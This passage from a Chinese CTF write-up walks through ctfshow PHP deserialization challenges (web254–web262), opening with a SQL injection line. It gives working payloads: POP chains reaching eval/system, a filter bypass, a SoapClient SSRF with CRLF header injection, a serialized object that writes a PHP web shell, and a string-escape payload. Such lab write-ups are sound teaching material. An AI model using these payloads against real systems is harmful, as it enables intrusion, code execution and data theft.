<code>1' uNion sELect 1,2,password from ctfshow_user--+</code></p><h2 id=反序列化 class=headerLink><a href=#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96 class=header-mark></a>反序列化</h2><h3 id=web254 class=headerLink><a href=#web254 class=header-mark></a>web254</h3><p><code>?username=xxxxxx&amp;password=xxxxxx</code></p><h3 id=web255 class=headerLink><a href=#web255 class=header-mark></a>web255</h3><p>GET:<code>?username=xxxxxx&amp;password=xxxxxx</code>
Cookie:<code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></p><h3 id=web256 class=headerLink><a href=#web256 class=header-mark></a>WEB256</h3><p>username 和 password 不相等，并且 isVip 为 True</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span> <span class=o>=</span> <span class=s1>&#39;aaa&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span> <span class=o>=</span> <span class=s1>&#39;bbb&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$isVip</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>ctfShowUser</span><span class=p>());</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><h3 id=web257 class=headerLink><a href=#web257 class=header-mark></a>web257</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$isVip</span><span class=o>=</span><span class=k>false</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$class </span><span class=o>=</span> <span class=s1>&#39;info&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>        
</span></span><span class=line><span class=cl>	    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>=</span><span class=k>new</span> <span class=nx>info</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>login</span><span class=p>(</span><span class=nv>$u</span><span class=p>,</span><span class=nv>$p</span><span class=p>){</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>===</span><span class=nv>$u</span><span class=o>&amp;&amp;</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>===</span><span class=nv>$p</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>        
</span></span><span class=line><span class=cl>	    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>-&gt;</span><span class=na>getInfo</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>info</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$user</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>backDoor</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$code</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=nv>$username</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>  
</span></span><span class=line><span class=cl><span class=nv>$password</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$password</span><span class=p>)){</span>    
</span></span><span class=line><span class=cl>	<span class=nv>$user </span><span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>    
</span></span><span class=line><span class=cl>	<span class=nv>$user</span><span class=o>-&gt;</span><span class=na>login</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>简单POP链，想要得到 flag 就需要 backDoor 类中的 geInfo 函数，因为其中包含 eval 函数可以进行命令执行，<code>code</code>这个私有属性储存着我们要执行的命令，触发<code>getInfo</code>的方法在<code>ctfShowUser</code>这个类中，所以我们可以利用他的<code>__destruct</code>函数来触发在创建对象时类的<code>__getInfo()</code>函数，通过<code>ctfShowUser</code>的<code>__construct</code>魔术方法来创建<code>backdoor</code>对象</p><pre tabindex=0><code>backdoor::getinfo&lt;--ctfShowUser::__destruct&lt;--ctfShowUser::__construct
</code></pre><p>因为 code 是private属性，所以要进行 urlencode，将不可见字符编码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>  
</span></span><span class=line><span class=cl><span class=k>private</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl><span class=k>private</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl><span class=k>private</span> <span class=nv>$isVip</span><span class=o>=</span><span class=k>true</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$class</span> <span class=o>=</span> <span class=s1>&#39;backDoor&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>=</span><span class=k>new</span> <span class=nx>backDoor</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>backDoor</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s1>&#39;system(&#34;tac flag.php&#34;);&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>ctfShowUser</span><span class=p>));</span>
</span></span></code></pre></div><h3 id=web258 class=headerLink><a href=#web258 class=header-mark></a>web258</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$isVip</span><span class=o>=</span><span class=k>false</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$class </span><span class=o>=</span> <span class=s1>&#39;info&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>=</span><span class=k>new</span> <span class=nx>info</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>login</span><span class=p>(</span><span class=nv>$u</span><span class=p>,</span><span class=nv>$p</span><span class=p>){</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>===</span><span class=nv>$u</span><span class=o>&amp;&amp;</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>===</span><span class=nv>$p</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>-&gt;</span><span class=na>getInfo</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>info</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$user</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>backDoor</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=nv>$username</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>  
</span></span><span class=line><span class=cl><span class=nv>$password</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$password</span><span class=p>)){</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/[oc]:\d+:/i&#39;</span><span class=p>,</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>])){</span>        <span class=nv>$user </span><span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>    <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>login</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>和上一题类似
过滤了 <code>O:数字:</code> <code>C:数字:</code> 的形式, 可以在数字前面加上 <code>+</code> 绕过
然后之前的 private 全部改成 public 了…</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;aaa&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;bbb&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$class</span> <span class=o>=</span> <span class=s1>&#39;backDoor&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>=</span><span class=k>new</span> <span class=nx>backDoor</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>-&gt;</span><span class=na>getInfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>backDoor</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s2>&#34;system(&#39;tac f*&#39;);&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>ctfShowUser</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;O:&#34;</span><span class=p>,</span><span class=s2>&#34;O:+&#34;</span><span class=p>,</span><span class=nv>$b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>PHP_EOL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=web259 class=headerLink><a href=#web259 class=header-mark></a>web259</h3><p>flag.php</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$xff</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>,</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>array_pop</span><span class=p>(</span><span class=nv>$xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=nx>array_pop</span><span class=p>(</span><span class=nv>$xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$ip</span><span class=o>!==</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>die</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$token</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$token</span><span class=o>==</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nx>file_put_contents</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>,</span><span class=nv>$flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>index.php</p><pre tabindex=0><code>&lt;?php  
  
highlight_file(__FILE__);  
  
  
$vip = unserialize($_GET[&#39;vip&#39;]);  
//vip can get flag one key  
$vip-&gt;getFlag();
</code></pre><p>通过 flag.php 可知必须本地访问flag.php 而且带上token，第一反应就是改 xff 为 127.0.0.1 但是这个题不行，因为有 cloudfare 代理无法通过本地构造XFF绕过，因此这题需要利用原生类的反序列化来实现SSRF，SoapClient原生类的反序列化，在本题的环境当中，由于使用Cloudflare 代理导致，Cloudflare 会将 HTTP 代理的 IP 地址附加到这个标头，在两次调用array_pop后我们取得的始终是固定的服务器IP</p><p>这里ip因为被pop了两次，所以分割后只剩了127.0.0.1，绕过了flag.php</p><p>poc：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$ua</span><span class=o>=</span><span class=s2>&#34;ctfshow</span><span class=se>\r\n</span><span class=s2>x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1</span><span class=se>\r\n</span><span class=s2>Content-Type:application/x-www-form-urlencoded</span><span class=se>\r\n</span><span class=s2>Content-Length:13</span><span class=se>\r\n\r\n</span><span class=s2>token=ctfshow&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$client</span><span class=o>=</span><span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span><span class=s2>&#34;127.0.0.1/&#34;</span><span class=p>,</span><span class=s1>&#39;location&#39;</span><span class=o>=&gt;</span><span class=s2>&#34;http://127.0.0.1/flag.php&#34;</span><span class=p>,</span><span class=s1>&#39;user_agent&#39;</span><span class=o>=&gt;</span><span class=nv>$ua</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$client</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>访问flag.txt，得到flag</p><h3 id=web260 class=headerLink><a href=#web260 class=header-mark></a>web260</h3><p><code>?ctfshow=O:18:"ctfshow_i_love_36D"</code></p><h3 id=web261 class=headerLink><a href=#web261 class=header-mark></a>web261</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfshowvip</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$u</span><span class=p>,</span><span class=nv>$p</span><span class=p>){</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>=</span><span class=nv>$u</span><span class=p>;</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>=</span><span class=nv>$p</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>!=</span><span class=s1>&#39;&#39;</span> <span class=o>||</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>!=</span><span class=s1>&#39;&#39;</span><span class=p>){</span>  
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>        <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__sleep</span><span class=p>(){</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>__unserialize</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>=</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>=</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code </span><span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=o>==</span><span class=mh>0x36d</span><span class=p>){</span>            <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>        <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;vip&#39;</span><span class=p>]);</span>
</span></span></code></pre></div><p>当 <code>__wakeup()</code> 和 <code>__unserialize()</code> 同时存在时, 仅会执行 <code>__unserialize()</code> 方法</p><p>当存在 <code>__serialize()</code> 时, <code>$data</code> 的值为该方法返回的数组, 否则为一个包含反序列化后的全部属性的数组</p><p>这里 <code>if($this->code==0x36d)</code> 使用了 <code>==</code> , 会进行类型转换</p><p>所以我们只需要构造一个以 0x36d 的十进制数 877 开头的文件名即可</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710370.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710370.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710370.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710370.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710370.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181710370.png 2x" sizes=auto alt=image.png></a></figure></p><pre tabindex=0><code>&lt;?php  
  
class ctfshowvip{  
    public $username = &#39;877.php&#39;;  
    public $password = &#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;;  
}  
  
echo serialize(new ctfshowvip());  
</code></pre><h3 id=web262 class=headerLink><a href=#web262 class=header-mark></a>web262</h3><p>反序列化字符串逃逸（字符变多）</p><p>这里 <code>str_replace()</code> 将 fuck 替换为 loveU, 多了1个字符，我们需要构造一个序列化的 payload, 内容是 <code>token=admin</code>
所以我们要逃逸的字符串就是这些，一共27个字符
<code>";s:5:"token";s:5:"admin";}</code>
注意闭合双引号, 以及最后的 <code>}</code>, 其中 <code>}</code> 表示反序列化的终止位置
而每从一个 fuck 到 loveU 能够逃逸1个字符
总 payload 就是 fuck*27 + payload
因为这里属性的顺序是 <code>$from $msg $to $token</code>, 所以我们在 <code>$to</code> 里面填写 payload</p><pre tabindex=0><code>?f=123&amp;m=123&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22;s:5:%22token%22;s:5:%22admin%22;}
